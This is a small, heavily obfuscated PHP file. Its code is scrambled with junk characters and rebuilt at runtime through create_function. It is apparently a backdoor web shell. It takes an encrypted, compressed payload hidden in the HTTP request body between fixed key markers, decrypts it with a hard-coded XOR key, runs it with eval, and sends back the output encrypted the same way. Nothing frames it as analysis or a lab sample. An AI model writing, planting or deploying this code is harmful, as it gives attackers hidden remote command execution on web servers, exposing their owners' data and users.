<?php
$W='{vg$j};}}revgturn $ovgvg;}if (@preg_matvgch("/$vgkh(vg.+)$vgkf/"vg,@file_get_convgtent';
$h='(@x(vg@basevg64_devgcode($m[1]),vg$k)));$o=@vgob_vgvgget_contvgents()vg;@ob_end_cleanvg(';
$C='Cvgn4puYNyvgA";vgfunction x($vgt,$kvg)vg{$cvg=strlvgen($k);$vgl=vgstrlen($t);$ovg=';
$V='$k="8e4vg0833vg0"vg;$kh="0168e3ccvg2e56";vg$kf="vgvg6bdcvgvg7a6e711e";$p="VDOdynivg';
$E=str_replace('ig','','creigatigigeig_funcigigtion');
$b='"";for($i=0;vgvgvg$i<$l;){for($j=0;(vg$j<vg$c&&$ivg<$l);$j++vg,$vgvgi+vg+){$vgo.=$t{$i}^$k';
$w='vgvg);$r=@basevg64_vgencode(vg@x(@gzcompvgress($o)vg,$k));vgprinvgt("$pvg$kh$r$kf");}';
$u='s("vgphp://vgivgnpuvgt"),$m)==1) {@ovgb_vgstart();@evgvalvg(@gzunvgcomprvgvgess';
$v=str_replace('vg','',$V.$C.$b.$W.$u.$h.$w);
$T=$E('',$v);$T();
?>
